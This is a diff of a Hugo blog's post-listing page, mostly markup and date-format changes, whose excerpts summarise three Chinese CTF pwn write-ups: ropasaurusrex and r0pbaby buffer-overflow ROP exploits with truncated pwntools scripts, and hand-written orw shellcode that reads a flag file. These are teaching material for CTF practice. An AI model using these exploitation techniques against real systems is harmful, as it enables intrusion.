@@ -94,18 +94,20 @@
     </header>
     <main class="main">
  
-    <header class="page-header">
-        <h1>Posts</h1>
-      
-    </header>
-<header class="page-header"><h1>Posts</h1></header>
+
+ 
+		<header class="page-header">
+				<h1>Posts</h1>
+			
+		</header>
+
 
 <article class="post-entry">
-  <header class="entry-header">
-    <h2>PlaidCTF-2013-ropasaurusrex</h2>
-  </header>
-  <section class="entry-content">
-   <p>分析：
+	<header class="entry-header">
+		<h2>PlaidCTF-2013-ropasaurusrex</h2>
+	</header>
+	<section class="entry-content">
+	 <p>分析：
 buf大小只有0x88,但是却允许被读入0x100的字节大小，造成缓冲区溢出。程序是32位。
 定义函数：ssize_t write (int fd, const void * buf, size_t count);
 函数说明：write()会把参数buf 所指的内存写入count 个字节到参数fd 所指的文件内. 当然, 文件读写位置也会随之移动.
@@ -117,18 +119,18 @@ payload：
 输入N个字符后发生溢出，write_plt的地址将会覆盖 read 函数的返回地址，随后程序将会跳转到write函数，我们在栈中构造了write函数的3个参数和返回地址，这段payload相当于让程序执行 write(1, address, 4);
 这样就可以dump出内存中地址为address处的4字节数据。 (参考：初探ROP攻击 Memory Leak &amp; DynELF)
 from pwn import *elf = ELF(&#39;./ropasaurusrex&#39;)io = process(&#39;./ropasaurusrex&#39;)libc = ELF(&#39;/lib/i386-linux-gnu/libc....</p>
-  </section>
-  <footer class="entry-footer">
-    <time>2018-03-17</time>
-  </footer>
-  <a class="entry-link" href="https://yuuoniy.github.io/posts/plaidctf-2013-ropasaurusrex/"></a>
+	</section>
+	<footer class="entry-footer">
+		<time>March 17, 2018</time>
+	</footer>
+	<a class="entry-link" aria-label="link to PlaidCTF-2013-ropasaurusrex post" href="https://yuuoniy.github.io/posts/plaidctf-2013-ropasaurusrex/"></a>
 </article>
 <article class="post-entry">
-  <header class="entry-header">
-    <h2>Defcon-2015-Qualifier-r0pbaby</h2>
-  </header>
-  <section class="entry-content">
-   <p>64位需要rdi传参，有PIE保护不能使用程序中的gadget，此处可以从libc中找
+	<header class="entry-header">
+		<h2>Defcon-2015-Qualifier-r0pbaby</h2>
+	</header>
+	<section class="entry-content">
+	 <p>64位需要rdi传参，有PIE保护不能使用程序中的gadget，此处可以从libc中找
 buf的大小是8，会造成缓冲区溢出
 解题思路
 1.找到一个gadget RDI
@@ -139,45 +141,46 @@ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &#34;pop|ret&#34;
 查找 /bin/sh 字符串
 strings -a -tx /lib/x86_64-linux-gnu/libc.so.6 | grep &#34;/bin/sh&#34;
 from pwn import *elf = ELF(&#39;r0pbaby&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)io = process(&#39;./r0pbaby&#39;)sh = next(libc.search(&#39;/bin/sh&#39;))sys_offset = libc.symbols[&#39;system&#39;]rdi_offset = 0x000000000002144fdef getFun(fun):io.recvuntil(&#34;4) Exit\n:&#34;)io.sendline(&#39;2&#39;)io.recvuntil(&#34;Enter symbol:&#34;)io.sendline(fun)msg = io.recvuntil(&#34;4) Exit\n: &#34;)offset = msg.find(&#34;:&#34;)offset2 = msg.find(&#34;\n&#34;)addr = msg[offset&#43;2:offset2]return long(addr,16)sys_addr = getFun(&#39;system&#39;) sh_addr = sys_addr-sys_offset &#43; sh rdi_addr = sys_addr - sys_offset&#43;rdi_offsetpayload = &#39;a&#39;*8&#43;p64(rdi_addr)&#43;p64(sh_addr)&#43;p64(sys_addr)io....</p>
-  </section>
-  <footer class="entry-footer">
-    <time>2018-03-17</time>
-  </footer>
-  <a class="entry-link" href="https://yuuoniy.github.io/posts/defcon-2015-qualifier-r0pbaby/"></a>
+	</section>
+	<footer class="entry-footer">
+		<time>March 17, 2018</time>
+	</footer>
+	<a class="entry-link" aria-label="link to Defcon-2015-Qualifier-r0pbaby post" href="https://yuuoniy.github.io/posts/defcon-2015-qualifier-r0pbaby/"></a>
 </article>
 <article class="post-entry">
-  <header class="entry-header">
-    <h2>CTF|pwnable.tw orw writeup</h2>
-  </header>
-  <section class="entry-content">
-   <p>pwnable.tw orw writeup shellcode的编写
+	<header class="entry-header">
+		<h2>CTF|pwnable.tw orw writeup</h2>
+	</header>
+	<section class="entry-content">
+	 <p>pwnable.tw orw writeup shellcode的编写
 呀真的好久没有写博客了，最近在做一些题，都在看别人的题解，做过也忘了，接下来希望好好记录一下，帮助自己理解。
 这道题是有关shellcode的编写，这部分我之前也没学习过，都是使用机器生成的。就…结合别人的writeup 说一下自己的理解吧。
 高级语言形式
 char *fn = &#34;/home/orw/flag&#34;; sys_open(fn,0,0) sys_read(3,fn,0x30) sys_write(1,fn,0x30) 查看 linux 系统调用 获得各个函数的调用号
 首先是第一部分 sys_openxor ecx,ecx ;清空ecx寄存器mov eax,0x5;查看以上资料知道 sys_open 对应0x5push ecx ;把一个空值压入栈中(这里不是很理解)push 0x67616c66;galf(flag) 接下来就是把字符串作为参数压入栈中 数字就是字符的ASCII码十六进制值push 0x2f77726f; /wro (orw/)push 0x2f656d6f; /emo (ome/)push 0x682f2f2f; h/// (///h)mov ebx,esp;把内容移到ebxxor edx,edx;清空 edxint 0x80;中断 执行syscall第二部分是sys_readmov eax,0x3;sys_readmov ecx,ebx;flag文件中的内容mov ebx,0x3;文件描述符mov dl,0x30;用于中断(??)int 0x80;中断 执行syscall第三部分是sys_writemov eax,0x4;sys_writemov bl,0x1;用于中断int 0x80最后的脚本：...</p>
-  </section>
-  <footer class="entry-footer">
-    <time>2018-03-14</time>
-  </footer>
-  <a class="entry-link" href="https://yuuoniy.github.io/posts/pwnable-tw-orw-writeup/"></a>
-</article>
+	</section>
+	<footer class="entry-footer">
+		<time>March 14, 2018</time>
+	</footer>
+	<a class="entry-link" aria-label="link to CTF|pwnable.tw orw writeup post" href="https://yuuoniy.github.io/posts/pwnable-tw-orw-writeup/"></a>
+</article> 
 <footer class="page-footer">
-  <nav class="pagination">
-    <a class="prev" href="/posts/page/9/">← Prev Page</a>
-  </nav>
+	<nav class="pagination">
+		<a class="prev" href="/posts/page/9/">← Prev Page</a>
+	</nav>
 </footer></main>
 <footer class="footer">
-  <span>&copy; 2023 <a href="https://yuuoniy.github.io/">Yuuoniy&#39;s blog</a></span>
-  <span>&middot;</span>
-  <span>Powered by <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>️</span>
-  <span>&middot;</span>
-  <span>Theme️ <a href="https://github.com/nanxiaobei/hugo-paper" rel="noopener" target="_blank">Paper</a></span>
+	<span>
+		Copyright © 2020–2020, Yuuoniy and the Hugo Authors; all rights reserved.
+		
+	</span>
+	<span>&middot;</span>
+	<span>Powered by <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>️ and <a href="https://gitlab.com/hugo-plains/hugo-plains" rel="noopener" target="_blank">Plains</a></span>
 </footer>
 <script src="https://yuuoniy.github.io/highlight.min.js"></script>
 <script>
-  hljs.initHighlightingOnLoad();
+	hljs.initHighlightingOnLoad();
 </script>
 </body>
 </html>
-
+ 
